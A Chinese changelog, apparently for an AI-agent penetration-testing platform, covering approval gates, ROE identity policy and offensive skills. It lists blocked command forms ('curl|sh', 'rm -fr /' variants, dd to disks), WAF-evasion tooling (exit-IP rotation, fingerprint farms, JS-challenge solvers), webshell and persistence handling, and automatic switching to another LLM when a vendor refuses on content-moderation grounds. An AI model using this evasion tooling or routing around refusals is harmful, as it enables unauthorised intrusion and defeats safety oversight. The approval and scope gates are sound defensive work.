 ## v5.2.0 · 2026-11-14
 
-- 新增（外部审计 P1-1·治理确定性校验）：①注册 deny 硬门——ROE identity.auto_register=deny（或未配置 Profile 平台默认 deny）时，run_command/run_async/shell_open 三通道对「注册端点写提交（POST/表单）」确定性拦截（GET 页面评估不受限），拦截文案指引授权路径；②strict_scope 范围确定性校验——命令中 URL/IP 目标必须落在主目标域（含子域）、已登记资产或良性外部白名单（crt.sh/github/NVD/pypi/镜像源/OOB 通道等，config guard.scope_allowlist 可扩充），范围外直接拦截并指引 record_asset（v52_gate_test 双门单测）
-- 修复（外部审计 P1-2·未知命令治理）：默认审批策略 l1→manual——L1（含未知命令兜底）全部人工审批，杜绝「未知命令经默认策略自动执行」；显式选择自动化的项目经项目级 l1/all 配置（行为不变）；配套 highRisk 补利用形态——管道执行（curl|sh）/系统路径写入（tee /etc 等）/xargs shell 即使 all 策略也强制人工（4 处测试期望同步升级）
-- 新增（外部审计 P1-3·供应链锁定）：三阶段基础镜像 digest pin（node/golang/kali）+ 4 个 go 工具版本 pin（nuclei v3.11.1/subfinder v2.17.0/httpx v1.12.0/ffuf v2.3.0）+ 3 个语料仓库 commit sha 校验（nuclei-templates/PayloadsAllTheThings/wxappUnpacker，漂移即 FATAL 拒绝产出）；README 补「供应链已锁定+离线边界」说明
-- 测试：v52 双门单测 + 全量核查/发版核查/干净包验收 3 连轮 + 部署（v5.2.0）
+- 新增（治理确定性校验）：注册写硬门与范围确定性校验
+- 修复（未知命令治理）：默认审批策略改仅 L1 自动；高危形态强制人工
+- 新增（供应链锁定）：镜像 digest、工具版本与语料仓库 commit 校验
 
 ## v5.1.4 · 2026-11-13
 
-- 修复（外部审计 P0·包源码不可构建）：pack.py EXCLUDE_DIRS 按目录名匹配曾把 server/internal/web（Go Web 路由源码）与根目录前端产物 web/ 一起剪掉——部署包内 go build 必失败（实测 ZIP 内 web 源码 0 文件）；改为 "web" 仅根目录级排除，其余目录名保持按名匹配；新增打包后包完整性自检（go.mod/web≥3/engine≥10/store/skills≥100/门/模板/禁入清单 13 项断言，缺失即退出非零）
-- 新增（P1-4·收包方验收）：scripts/verify_package.sh——不依赖 go/容器/config.json 的轻量包验收（ZIP 结构/关键路径/源码计数/禁入项泄漏），verify_release 增包完整性项
-- 新增（P2-1）：strip-fcaps 函数化 + --selftest（合成 security.capability 位图校验越界判定/干净放行/短 raw 拒绝）；16 工具 selftest 状态核实：11 独立 PASS + 3 由 browser-kit 套件端到端覆盖 + 1 本版补齐
-- 修复（P1-4/P2-2 措辞）：README 快速开始包名改版本化占位（消除 v5.1.1 陈旧引用）；模型接入补「切换边界」——自动切换仅限供应商拒绝类（4xx/内容风控），网络/超时走同模型重试（代码 v2.7 A8 已实现，文档校准）
-- 新增（P2-3/P2-4·证据留痕）：docs/evidence/release-v5.1.3 归档三轮核查/发版核查/文件层/ROE 完整输出；docs/case-study IOP 实战脱敏任务记录（域名/IP 泛化，供对外引用）
-- 测试：干净解压 go build/vet/test 3 连轮 + 干净 compose 启动验证 3 连轮 + 全量核查/发版核查 3 连轮 + 重打包（v5.1.4）
+- 修复（部署包构建失败）：目录排除规则修正与打包后完整性自检
+- 新增（收包方验收）：轻量包验收脚本
+- 新增（strip-fcaps 自测）
+- 修复（README 措辞）：包名版本化与模型切换边界说明
 
 ## v5.1.3 · 2026-11-13
 
-- 修复（实战监控八项发现·引擎①）：三振出局与预算代收口从「跳过全部硬门」改为「降级门」——LLM 反思跳过但确定性门照跑并强制通过；代收口拦截项转记 Review+时间线供 S8 复核（实战实证 TH-23/24 高价值候选曾经 S4 代收口+S5 改写静默蒸发，旁路≠跳门）
-- 修复（监控④+③·V8 闭环）：update_coverage 时覆盖矩阵同步落盘工作区 coverage.json（离线门读文件而非 DB——此前真实项目 V8 对覆盖率形态失明）；coverage_gate 端点表来源扩展 deliverables/*端点表*.md 表格抽取（实战实证端点表写成 deliverable md 时 V8 失明，现对已完成任务实弹提取 34 行）
-- 修复（监控⑤⑥）：M4 日期门补拦年份级日期幻觉（deliverableYearRe，实战实证 S1 交付物「日期：2025」漏网）；项目未配置 YAML ROE Profile 时注入默认从严运行时口径（write_policy/auto_register=deny/自建数据不删除——文本 ROE 不再无运行时含义）
-- 新增（用户政策·自建数据不删除）：清理铁律全域改写——自建账号/业务行/探针文件/上传件/载荷一律只登记四元组移交、不执行删除（先 SELECT 后登记）；loop-core 合规前提 2+清理铁律、heads/s7 S7-2、session-state-chain D 节、identity-bootstrapping ROE allow 轨同步；S7 清理确认清单执行侧改为「登记完整性核对+只读复核」
-- 修复（监控⑦⑧+S5 反蒸发）：E1 claims 的 file 禁止范围式/通配写法（实战实证 bf-1..10.h 不可机验，多文件逐条列出）；空响应体证据落占位行（0 字节文件被 E2 拦截且不可区分于截杀）；heads/s5 S5-1 承接改写反蒸发硬规则（承接 S4 ready_but_unexecuted 逐条三态映射，禁止静默丢弃——实战实证 TH-23/24 曾因改写丢失）
-- 测试：全量核查 3 连轮 + 发版核查 3 连轮 + 重打包（v5.1.3）
+- 修复（三振出局降级门）：确定性门照跑并强制通过；拦截项转记供复核
+- 修复（覆盖矩阵落盘）：同步落盘 coverage.json
+- 修复（日期门补拦）：年份级日期幻觉拦截；无 ROE Profile 注入默认从严口径
+- 新增（自建数据不删除）：清理铁律全域改写为登记移交
+- 修复（证据可机验）：claims 文件禁止范围式写法；空响应体落占位行；S5 承接反蒸发规则
 
 ## v5.1.2 · 2026-11-13
 
-- 修复（无死角终审·引擎 P0×3）：①s3 收口「阶段已收口」精确相等比较 vs R7 附注返回 → HasPrefix（必现 bug：s3 常规成功路径永不结束、反复重跑对抗假设烧尽预算并覆盖摘要）；②shell_write 会话注入完全绕过审批矩阵 → 输入同等受控（Forbidden 拒绝/L1+ 审批留痕，L0 即时放行零摩擦）；③install_tool 完全免批（工具描述声称「写入审批」与事实不符）→ 接入审批矩阵（L1，auto 策略下自动通过并留痕）
-- 修复（引擎 P1×5）：三振出局旁路显式留痕（第 3 次收口跳过硬门时记日志+Review 标记，质量责任移交 S8 可见）；roe.go 嵌套键扁平化 bug（identity.cred_attack.* 被错挂、Digest 静默丢失）→ 前缀栈解析；并行 spawn_subagent ID 纳秒取模高概率碰撞 → 随机后缀（防注册表覆盖失联）；chat 轮结束 cancel 泄漏（chat 派发子代理可越过项目生命周期继续执行）→ 轮末取消；s8 门 nil StageState 解引用防崩溃
-- 加固（引擎 P1 配套）：破坏性禁令补全（rm -fr / 变体、dd of= 扩 vd/nvme/hd）；敏感面 glob 绕过补口（/proc/1/en* 类）；AutoApprove 注释与实际默认值（l1）对齐
-- 修复（工具层 P0×1+P1×5）：primitive-graph extract() 大小写正则错配→核心函数死路（S5 收口原语图产出恒空）→ 实弹复活（实测提取 DB-READ/SQLI 并输出凑链）；chain-proxy 挑战态 Cookie 随 30x 重定向泄露到任意外部主机 → 禁自动重定向+跨主机剥除挑战态；logic-invariant 跳步/逆序类 seq 混入状态名从未真正构造（对无守卫业务全量误报）→ 纯动作序列+推进判据反转；blind-inject-adjudicator 假值测量失败伪造 boolean_true → status!=0/200 门槛；captcha-ocr 按文档喂标准 PBM 即崩溃 → P1 头+0/1 双格式加载（实测通过）；authz-diff 补技能强制的阴性对照（随机乱码路径×2+通配 200 分桶 MISS-WILDCARD）
-- 修复（知识库结构）：5 个孤儿技能补入路由器全集索引（recon-playbook/web-top10/app-dynamic-audit/miniapp-audit/poc-template——此前 S2 主手册与 APP/小程序实操手册均无正式入口）；heads/s6 persistence「第六节」→第五节指针修正；loop-core 规则 12 移交链补身份索取闭环（与 identity-bootstrapping v5.1 对齐）
-- 修复（交付链 P0×2+P1×3）：README 补「新机部署 Quickstart」（收包方视角：解压/前置/【致命】config.json 创建/构建/验收/升级——原缺失导致新机首跑必然崩溃循环）；8787 端口默认绑定收敛 127.0.0.1（默认口令公开文档化，0.0.0.0+tunnel 公网即沦陷）；pack.py jtn-private 路径与 sweep 对齐（原目标特定模式静默未加载）+排除清单补 jtn-private；verify_release go 路径自动发现；deploy 就绪检查重试 6 次
-- 测试：全量核查/发版核查/重新打包（v5.1.2）
+- 修复（收口比较）：s3 收口返回值改前缀匹配
+- 修复（会话注入绕过）：shell_write 输入纳入审批矩阵
+- 修复（install_tool 免批）：接入审批矩阵
+- 修复（引擎健壮性）：三振留痕、ROE 嵌套键解析、子代理 ID 碰撞、对话轮取消泄漏、nil 防崩溃
+- 加固（破坏性禁令）：补全破坏性命令变体与敏感面特征
+- 修复（工具层）：六个辅助工具缺陷修正
+- 修复（知识库结构）：孤儿技能补入路由索引
+- 修复（交付链）：新机部署指引、端口绑定收敛、打包排除清单补齐
 
 ## v5.1.1 · 2026-11-13
 
-- 修复（对抗性复审 P1·政策执行残留）：logic-csrf-deser 越权矩阵「自建账号」→客户提供账号+三态路由（同文件与模板自相矛盾消除）；注册位 mass assignment/注册覆盖链补 ROE 门控（评估态只做流程还原，实测需 allow+孤儿测试账号，禁指向真实用户）；auth-bypass 补无凭据口径并同步注册覆盖链门控；s5 头 S5-2 旧「注册→登录标准链」改为 session-state-chain 决策树路由（与相邻 S5-2a v5.1 段冲突消除）
-- 修复（对抗性复审 P2·引擎编排层同步）：orchestrator.go W4 注入文本升级 v5.1——L1 评估轨（命中不建会话不注册，发现本身入账）+ 全轨未命中先走身份索取闭环再移交（原「首轨命中即建会话/全轨失败即移交」跳过两项关键语义）；roe.go Digest() 增输出 identity.auto_register 运行时含义（deny=注册面只评估不注册/allow=可自建+S7 清理）——身份政策从纯提示词约束升级为运行头可见
-- 修复（对抗性复审 P2·技能层口径补全）：identity-bootstrapping 第八节 v4.8 协议与一a节对齐（命中轨分类处置/移交前索取闭环）；api-idor 补无凭据路由与「水平越权=同角色两账号」供给口径；auth-flow-deep/upload-bypass/graphql-websocket/00-router 措辞同步（测试账号来源=客户提供/索取闭环；路由器 L1 评估轨措辞）
-- 测试：文件层核查扩至 ⑲ 复核锁定组（+25 项）；全量核查 3 连轮 + 发版核查 3 连轮 + 重打包（v5.1.1）
+- 修复（政策执行残留）：越权矩阵账号口径统一；注册覆盖链补门控
+- 修复（编排层同步）：身份政策注入文本升级；ROE 摘要输出运行时含义
+- 修复（技能层口径）：五个技能措辞同步
 
 ## v5.1.0 · 2026-11-13
 
-- 新增（全量未授权检测硬门·用户指令①）：authz-diff 第五节——无 token 列纯匿名、禁止以「等拿到身份再测」推迟或抽样；端点表 N 行 100% 入矩阵、三态处置、update_coverage 记账 diffed/total；coverage_gate 新增 V8 端点表↔矩阵计数对账（夹具 case13）；loop-core 深度测试纪律 13（所有任务强制）；intel-factory 端点表 # total=N 口径
-- 新增（写端点门控判定·api-doc-leak 补偿条款·用户指令②）：POST/PUT/DELETE 端点的门控存在性必须判定（OPTIONS 枚举方法+匿名 GET 判读 401/302/hasLogin:false），不实调；门控缺失写端点 conditional 呈现、实测 L2+ROE 最小状态变更——禁止「只看不调=不测」的覆盖空洞
-- 新增（身份政策·用户指令③）：ROE identity.auto_register 默认 deny——L1 注册面只评估不注册（开放注册本身仍是发现）；新增「身份索取闭环」（六轨走完仍无身份→request_user_input 向客户索要低权+高权测试账号，拒绝/超时才移交）；会话伪造合规边界——仅基于已确证伪造漏洞构造自有会话（L5/L6），禁止窃取/重放真实用户活跃会话；session-state-chain 决策树按 ROE 重排
-- 新增（无凭证三态路由推广）：web-top10/csv-injection/race-condition/graphql-websocket/jwt-crypto/cache-poisoning/logic-csrf-deser/logic-purchase-limit 八技能统一路由——①有客户提供账号→全量差分 ②仅匿名→替代探针+VT 移交（禁止静默跳过）③无入口→needs_follow_up 显式登记
-- 新增（家族覆盖）：edu-family（金智 ehall/psfw/taskcenterapp/rsfw·VSB·正方/青果·超星首查清单）+ idp-family（CAS/Shibboleth/深澜）双家族剧本；framework-priors 新增「指纹未命中→通用未授权清单+家族检索」兜底硬规则；oa-family 逐厂商未授权首查清单；nuclei-usage 指纹→模板组映射表；router 登记
-- 新增（未授权利用口径·gateway-filter 二a）：读端点量化三件套——量级证明（count/分页差分，不导出）+ 单条样本（哈希前缀/掩码）+ 可达性边界；写端点 conditional 双轨与 L2 链衔接
-- 修复（P1 内容质量）：spring-family Spring4Shell 编号 22904→22965（以检索为准）、cms-playbook 悬置编号降为检索口径、middleware-web 补 MinIO bootstrap 泄露面；内部案号（0F60/1937/069E）与运行时残留（「本轮已实战验证」、示例真实 IP）净化；type-juggling 勘误并回正文；xslt-injection 处置口径对齐全域驻留铁律；rce-hunting-map 补遗节补 S5 准入；sqli-deep Oracle/PG 拼接语法与 tamper 笔误修正、批量 L2 口径统一；poc-template 判定重写（归一化+单变量+2 遍复测）且复现证据标准单源化至 report-writing；evidence-standard 补 XXE/请求走私/缓存投毒/GraphQL/原型污染/业务逻辑三类确证行（反序列化对齐三重取中位）；anon-attack-surface PUT 写探针移出 L0 自动执行集；recon-playbook 获权后链标注 S5/内网窗口；capability-primitive-search BURN 频控硬门；weak-cred-bruteforce XFF 头族 ROE 门与反向爆破额度
-- 增强（P2）：tool-channels.md M6 单源判据（ad-attack/intranet-lateral/windows-lateral/tunnel-pivot 四技能去重引用）；cloud-security 重写（腾讯云/华为云/Azure 元数据、IMDSv2 流程、OSS/COS/OBS/S3 四族）；middleware-web 补 RocketMQ/ActiveMQ/RabbitMQ/ES/Kibana/Dubbo/ZK/Druid/APISIX/Kafka-ui 十组件探针位；edge-vpn-bastion 补华为/H3C/网康/安恒指纹；js-challenge-waf-playbook 通用 JS 挑战特征表（去瑞数单族绑定）；privesc-checklist 补 sudo 版本/docker 组/AlwaysInstallElevated 等常规向量与「全不中出口」；report-writing 补漏洞编号规范/密级分发/复测章节；subdomain-takeover 技能补建（消解 C-26 悬空引用）；rate-limit-playbook W5 判定顺序（路径级/IP 级/全局级三分）；app-ios 获取路径更新、app-dynamic 矛盾清理、app-static/mail-postex 错字修正；miniapp-server 签名还原统一 oracle 标准
-- 测试：文件层核查扩至 v5.1 检查组（A/B/C 三批 244→321 项）；离线门夹具 13→14（case13 端点表对账 V8）；全批次实施采用「每批次编辑后连续 3 轮全面核查（run_comprehensive 四合一）全 PASS」验收口径，A1/A2-A6/B 批次均 3×4/4 PASS
+- 新增（全量未授权检测硬门）：端点表 100% 入矩阵三态处置；端点表对账门
+- 新增（写端点门控判定）：写端点门控存在性必须判定
+- 新增（身份政策）：注册默认 deny；身份索取闭环；会话伪造合规边界
+- 新增（无凭证三态路由）：八技能统一路由
+- 新增（家族覆盖）：教育/IDP 家族剧本与框架先验兜底
+- 新增（未授权利用口径）：读端点量化三件套
+- 修复（内容质量）：多技能编号、口径与措辞修正
+- 增强（多技能扩容）：云安全/中间件/边界设备等十余技能扩容
 
 ## v5.0.0 · 2026-11-12
 
-- 新增（代理模块·用户想法①）：Web 设置页新增「代理配置」——三类流量分级：①工具下载代理（$TOOL_PROXY 热生效，沿用智能体按需 env 前缀纪律）；②目标流量出口池（默认关闭——对目标流量默认直连口径不变，启用后写入 dataDir/exit-pool.json + $JT_EXIT_POOL 注入，W5 exit-pool.py 按需消费，项目级显式启用+ROE 留痕）；③LLM 出口只读展示（跟随部署环境变量）。支持 http/https/socks5（含 user:pass@host:port 认证），端点加密存储、UI 掩码回显、连通性测试按钮；命令环境改为「测绘 Key+代理变量」合并重建（rebuildCommandEnv，启动恢复/设置保存双路径），避免相互覆写
-- 新增（设备连接启用按钮·用户想法②）：设备连接页 7 种场景交互化——确定性动作经新增 POST /api/devices/action 后台执行（无线配对 adb pair（表单 IP/端口/配对码）/连接/断开、tcpip USB 环境检测、共享宿主 adb server 校验、热点网段只读探测、frida -H 直连测试、隧道 TCP 校验、云真机平台可达性），参数严格校验（IP/端口/配对码正则）、exec 直执行无 shell、带超时熔断与服务审计日志，结果实时回显并联动刷新实时状态；场景 2 增设环境检测（容器视角 USB 序列号探测），场景 5（USB 直通）保持禁用态与理由展示；多步编排（frida-server 推送/抓包链）仍由智能体 run_async 按 D1-D6 执行，长驻进程不进本接口
-- 新增（proxy-channels 技能）：代理通道使用手册——三类流量变量用法 + 工具代理旗标映射（sqlmap/nuclei/httpx/curl/nmap 差异，env 试探→原生旗标→不适用如实写交付物）+ W5 出口池会话分片纪律衔接；路由器索引同步
-- 测试：web 纯函数单测（代理端点校验/掩码、设备参数校验防注入）；全面核查 + 文件层核查扩至 v5.0 检查组；部署核验扩项（代理/设备接口、版本三处对齐）
+- 新增（代理配置模块）：工具下载/出口池/LLM 出口三类流量分级，支持 http/https/socks5 与认证
+- 新增（设备连接启用按钮）：七种连接场景交互化，参数校验与审计日志
+- 新增（proxy-channels 技能）：代理通道使用手册
 
 ## v4.9.0 · 2026-11-12
 
-- 修复（F1·V3 收口清单双通道提交）：complete_stage 工具 schema 补声明 ready_but_unexecuted / l2_approved_unused 顶层 JSON 数组参数（此前 schema 未声明+拦截文案未教传法，实测模型 93 次收口调用 0 次顶层传参全部被拦）；拦截文案改为明确教两种提交方式（顶层字段 / summary 字面格式），并明示「不要写进交付物文件或时间线登记」
-- 修复（F1·summary 约定格式回退解析）：V3 门新增从 summary 文本解析两清单的回退通道（主形态 [:=：]+配对中括号，宽松形态覆盖中文连接；内容优先 JSON 数组解析、分隔符宽松切分兜底，上限 100 条防病态输入）——实测模型把清单写进 summary 是高频稳定行为，只堵不导=60 轮烧尽死循环；解析器 12 形态单测覆盖（TestV49ParseV3ListFromText）
-- 新增（F2·预算护栏代收口）：阶段迭代轮次耗尽由「硬中止流水线」改为引擎代收口——等待收割在途子代理（≤90s）→ 按 VT 验证台账代填 V3 清单并留痕（仅 s4/s5 收 pending/ready 未投递项；l2_approved_unused 不代填，审批与执行配对无法机械判定未使用）→ 阶段 done+quality-pending，流水线继续（S8 收口门强制复核不无声放行）——消除「停跑→手动重跑→再撞墙」死循环（实测一在测项目 s4 曾六连败共烧 ~3490 万 tokens）
-- 新增（F3·s4 阶段预算 ×2）：stageBudget 中 s4 漏洞发现与 s8 报告同享 ×2（最重执行阶段 60 轮实证结构性不足，多目标自适应封顶随之 3×base×mult）；迭代预算预警与最终收口指令同步教顶层参数写法；「预算耗尽（达到迭代上限）」文案正名为「迭代轮次耗尽」（原文案误导排障方向：token 预算实际未启用）
-- 核验（发版纪律补课）：本次发版补跑 verify_release 全项核查（版本常量/更新记录/README 版本行三处对齐此前遗漏）；真实任务断点续跑实测——s4 在新引擎下 3 次收口尝试全部越过 V3 门，阶段正常收口（30 轮，远低于上限）流水线进入 s5，无预算耗尽复发
+- 修复（V3 清单双通道提交）：complete_stage 补声明两清单参数，拦截文案教提交方式
+- 修复（summary 回退解析）：V3 门新增 summary 文本解析回退通道
+- 新增（预算护栏代收口）：轮次耗尽改为引擎代收口，流水线继续
+- 新增（s4 预算翻倍）：s4 与 s8 同享双倍预算
 
 ## v4.8.1 · 2026-11-12
 
-- 修改（上传与驻留处置口径·v4.8.1 用户指令）：①渐进式上传验证协议——先常规文件类型（无害内容）验证上传面，再尝试可执行脚本（经审批），每一步上传的每个文件登记《上传文件记录清单》（upload-bypass/webshell-memshell/矩阵 C-14）；②全域驻留只记录不处置——智能体产生的全部后门/驻留工件（包含但不限于上传类：文件马/内存马/计划任务/服务/SSH 公钥/新增账号/注册表/WMI/启动项修改）一律只登记四元组移交《需人工清理清单》，禁止对目标执行删除/重启/Filter 卸载/还原等高风险操作（loop-core 清理铁律新条+s5/s6/s7 头+persistence 同步，内存马「重启即清除」改为建议处置说明移交人工）
-- 新增（存量持久化痕迹排查·S6-6）：拿到 RCE/落点后对主机做「既有持久化面只读清点」（排查前人/第三方遗留后门：cron/timer/SSH 公钥/启动项/隐藏账号/异常监听/进程/Web 目录可疑可解析文件/容器挂载/数据库作业，per-OS 清单）——口径「只发现、只登记、不处置」：逐项 record_finding 附只读证据 +《需人工清理清单》移交（存量数据绝对不动），S8 报告「存量风险」单列标注避免责任混淆；persistence 技能新增第五节排查清单与处置口径，与 S6-4 自建演示四元组严格隔离
-- 核验（部署实测·修复）：镜像重建+容器上线部署核验 17 项实测——捕获两处零靶场 token 残留（K2 卡通用术语与历史更新记录条目各撞一处历史靶场 token/端点细节：v4.7.1 净化扫描未覆盖 ChangelogPage.vue，本条目已同步避免复述该 token 字面量），均已净化；零靶场扫描扩围至 skills/heads/prompts/ChangelogPage（文件层核查 ⑤e2，192→196 项）锁死回归
+- 变更（上传与驻留处置）：渐进式上传验证协议；全域驻留只登记移交不处置
+- 新增（存量持久化痕迹排查）：只读清点存量持久化面
 
 ## v4.8.0 · 2026-11-12
 
-- 新增（批1·§一 筛查矩阵）：skills/hypothesis-matrix.md——K3 假设模式库（27 类筛查问句×高风险假设模式×通用判据，三态判定协议：假设/不适用/待判定+双假设并列，零新增主动流量）；s3 头 S3-9 判定表交付物（deliverables/s3-筛查矩阵判定表.md，27 行 C-01..C-27）+ S3-10 假设缺漏审查（R7 第一层五项自审清单）；路由器/loop-core 同步
-- 新增（批1·§二 R6/R7 第一层 + M6）：s4 头 S4-10 威胁清单实测回填（extends/replaces/creates 三态关系，回填前 search_memory 对照，与 B1 判重同源）；loop-core v4.8 纪律节「先 probe 后 batch」前置规则；30 个 recon/scan 与对抗类技能注入 M6 工具通道兼容性声明（挑战型 WAF/封闭站可用性+适配通道，22 项规范工具全量覆盖）
-- 新增（批2·M2/M4/M5 确定性门）：M2 s3 收口门——判定表存在且 27 行三态留痕完整（只查留痕不查内容，防诱导式编造）；M4 交付物时间一致性门——带标签日期字段必须落在任务时间窗内（防日期幻觉）；M5 quality-pending 频次监控——按阶段统计反思门调用失败，持续高失败注入修复提示
-- 新增（批2·R7 第二层对抗假设 pass）：s3 收口时引擎以独立 LLM 会话（红队视角）生成对抗假设清单 → 与主清单归一化 diff → 差异项自动 record_vt（pending，确认后转 ready，单次上限 5 条防洪水）；全量记录落盘 deliverables/s3-对抗假设审查.md；非阻塞增强项
-- 新增（批3·K1/K2 知识资产）：skills/industry-templates.md——K1 行业模板六件（医疗/金融/教育/政务/企业通用/互联网业务，升格表+数据类具象表×6）；skills/framework-priors.md——K2 框架先验卡四件（Java/PHP/Python/Node 系：指纹→先验假设→首查清单）；与 K3 矩阵/s3 头双向挂接
-- 新增（批4·W4 身份获取编排器）：引擎六轨编排（L1 注册面→L6 会话构造）——上下文包编排提示 + s4 收口门逐轨 VT 留痕硬校验（[W4-L1]..[W4-L6]，不适用轨也登记；已获身份首轨留痕口径；全轨失败移交链完整）；identity-bootstrapping 技能编排协议（OCR 取码→识别→立即提交单会话闭环+预言机分流）
-- 新增（批4·W6 注入与业务逻辑自动化四件）：tools-extra/chain-proxy.py（挑战态上游代理链：快照态→sqlmap/nuclei --emit/--serve，自测 4/4）；blind-inject-adjudicator.py（盲注三通道自动裁决：布尔/时延/带外建议，自测 3/3）；idor-baseline.py（IDOR 采样→自增判定→匿名差分→量化，自测 3/3）；logic-invariant.py（状态机跳步/逆序/重复违例探测，dry-run 默认，自测 2/2）；Dockerfile +4 COPY
-- 新增（批5·W5 对抗穿透基础设施）：exit-pool.py（多出口轮换+会话按出口分片+降级显式错误，自测 5/5）；browser-farm.py（指纹池化轮换+CDP 泄露面清洗清单 7 项，自测 4/4）；jsvm-challenge-solver.py（JS-VM 特征识别+反混淆脚手架，ROE offline_challenge 门控 --roe-allow，自测 3/3）；行为预算器（引擎级：批量配额 12/10min+空壳即停 3 连+完全静默冷却+批间基线自检提醒，run_command/run_async 双通道前置闸）
-- 新增（批6·W7 图引擎）：tools-extra/primitive-graph.py 升级图引擎——正向 BFS 多跳路径/反向回推缺口/缺口自动 record_vt 参数块/战利品网络扇出（CRED→新入口四路推荐），自测 6/6；修复 extract 路径 PRING_RE 潜伏 NameError
-- 新增（批6·E1 埋点扩展 27 类体系）：评测包 target/ 种植 13 个新矩阵类面（C-02/03/05/06/09/15/16/17/18/19/20/23/25）+ OAuth/CAS mock（C-04：state 缺失/code 重放/回调劫持/预绑定接管，自测 5/5）+ 对抗 mock gateway 模式（C-10 规范化绕过/C-11 Host 直连/C-27 组件指纹）；expected.json 每埋点 matrix_class 标注（25 类可种植+C-24/26 监控替代）；smoke_test 扩至 15 场景 15/15
-- 新增（批6·三指标判分）：eval_run.py 常驻输出三指标——假设召回率（≥80%）/不适用误判率（=0）/假设精度（≥90%），判定表↔expected matrix_class 比对，mock 面召回单列，监控替代条目不计分；修复 eval_run.py 两处 f-string 内层引号未转义的潜伏语法错误（文件此前无法被 Python 解析，py_compile 已纳入文件层核查锁定）
-- 核验（部署实测）：镜像重建+容器上线部署核验 17 项——捕获并修复两处零靶场 token 残留（K2 卡通用术语撞历史 token/历史更新记录残留靶场端点细节，v4.7.1 净化扫描未覆盖 ChangelogPage），零靶场扫描扩围至 skills/heads/prompts/Changelog 锁死回归
-- 测试：全六批各连续 3 轮全面核查 4/4 PASS；引擎 build+vet+全量单测（新增 v4.8 门专项 10 项：M2 判定表四分支/M4 时间窗三分支/M5 频次/R7 解析与 diff 与 fail-open/W4 六轨门六分支/W4 提示/W5 行为预算器六分支）；文件层核查 192 项
+- 新增（筛查矩阵）：27 类假设模式库与判定表交付物
+- 新增（威胁清单回填）：实测回填三态关系
+- 新增（确定性门三件）：判定表留痕门、日期一致性门、反思失败频次监控
+- 新增（对抗假设 pass）：收口时独立会话生成对抗假设并入验证队列
+- 新增（行业模板与框架先验）：行业模板六件与框架先验卡四件
+- 新增（身份获取编排器）：六轨编排与逐轨留痕硬校验
+- 新增（注入与业务逻辑自动化四件）：代理链/盲注裁决/IDOR 采样/状态机探测
+- 新增（对抗穿透基础设施）：出口池/浏览器农场/JS 挑战求解/行为预算器
+- 增强（原语图引擎）：正向扩展与反向回推、缺口自动入队
+- 新增（评测埋点扩展）：13 类新矩阵面与对抗 mock
+- 新增（三指标判分）：假设召回/不适用误判/假设精度
 
 ## v4.7.1 · 2026-11-11
 
-- 架构（评测体系与平台分离）：部署包/镜像零靶场信息——Dockerfile 拆分 COPY（镜像仅含通用判分器 eval_run.py + ROE 示例，靶标应用/埋点清单/对抗模拟器全部移出镜像）；评测内容外置为独立私有评测扩展包（JTN_EVALPACK_PATH 加载，含使用契约说明），新机部署零靶场/埋点痕迹
-- 改进（历史目标痕迹清零·绝对口径执行）：更新记录历史条目中靶场端点细节改写为能力描述；技能/阶段头/优化方案文档中任务号与目标标识全部泛化为类别化描述（机制与数据全量保留，外部留存完整溯源版）；敏感模式扫描器与打包器目标特定模式外置（JTN_SWEEP_PATTERNS，缺省仅通用模式生效）——新机分发包不携带历史目标痕迹
-- 改进（评测判分器通用化）：eval_run.py 靶标/埋点路径改为外部评测包加载（env/默认同级探测），Docker 容器执行同步适配；Makefile eval 目标透传 JTN_EVALPACK_PATH；离线质量门对抗 mock 冒烟改为评测包存在时执行（未挂载显式跳过）
-- 测试：部署范围敏感扫描清零（真实目标标识/埋点端点词/靶场应用文件三组 token 全项目可见层 grep 0 命中）；判分器/扫描器/打包器 py_compile 通过；文件层核查扩至 47 项 3×（mock 冒烟评测包挂载态）；全面核查 3× 4/4；镜像重建部署核验 3× 12/12（新增容器内零靶场内容检查）
+- 架构（评测体系分离）：靶场信息移出镜像，评测内容外置独立扩展包
+- 改进（历史痕迹清零）：记录与技能内容目标标识泛化；敏感模式扫描外置
+- 改进（判分器通用化）：评测路径外部包加载
 
 ## v4.7.0 · 2026-11-11
 
-- 新增（v4.5 收尾·V2 引擎枚举）：预算预警消息升级——触发时引擎自动枚举验证队列 ready/pending 项（VT-ID/状态/优先级/标题/就绪资产路径）注入消息，按序投递（原为提示词级，现为引擎数据驱动）
-- 新增（v4.5 收尾·V4 L2 已批未用门）：s7 收口比对已批准 L2 工单——既无使用痕迹（时间线/交付物/VT 引用）也未在 s4/s5 收口清单（l2_approved_unused）申报者拦截清点（某限速案例 L2 已批全程未用且 S7 主动终止无申报的审计形态）
-- 新增（v4.5 收尾·K5 完整心跳标准件）：browser-kit/channel-heartbeat.py——空闲窗口 run_async 调度的周期性 dump-dom 基线自检，字节判定状态机（healthy/degraded/down_candidate/连续 2 次 down），落盘 evidence/channel-status.json 供 S6 开工直读（该审计案例 曾 8h 空窗无人检测）；selftest 状态机 5/5
-- 新增（W4-C1 验证码 OCR 产品化）：tools-extra/captcha-ocr.py——列投影分割+孤立点去噪+行裁切+位移对齐模板匹配（纯 python 无 PIL 依赖），合成验证码闭环自测 6/6（随机位移/挖孔/附着噪声）；分割数不符返回 None 强制降级人工判读（evidence-standard 单会话闭环口径内嵌）
-- 新增（W7-lite 原语图）：tools-extra/primitive-graph.py——从 findings.json 提取 primitive: 标注，按 7 条链模板（LFI→CRED→DB-READ / SSRF→ADMIN-REACH→EXEC / AUTHZ→PII 等）输出「已具备→缺口→下一动作」建议（正向扩展+反向回推），缺口项配合 record_vt 入验证队列；selftest 3/3
-- 新增（T3/H ROE Profile 引擎消费）：config 新增 roe_profile_path；internal/engine/roe.go YAML 子集解析+schema 校验（非法 fail-fast 拒绝启动）；运行时含义摘要注入上下文包（write_policy=existence-proof 映射「写操作仅存在性证明」、windows 窗口外禁主动流量、waf offline_challenge deny 映射对策阶梯、住宅代理/字典上限口径）；测试覆盖加载/校验/注入/未启用四分支
-- 修复（过程）：roe.go lastSection 游标在节头即更新（原只在叶子更新，waf_policy.* 被错挂到前一节导致 Digest 缺行）；captcha-ocr 字模编码统一为 #/. 并修复行填充宽度（单字符行插入致 gw=1 字形重叠）；测试 TestV46cGateL2Unused 改用 AddApproval 返回 ID（引擎生成 ID 覆盖预设值）
-- 提示词：s4（OCR 默认工具+降级口径）、s5（原语图收口动作+心跳调度）、s6（channel-status.json 直读）；Dockerfile +3 行（captcha-ocr/primitive-graph/channel-heartbeat 进镜像）
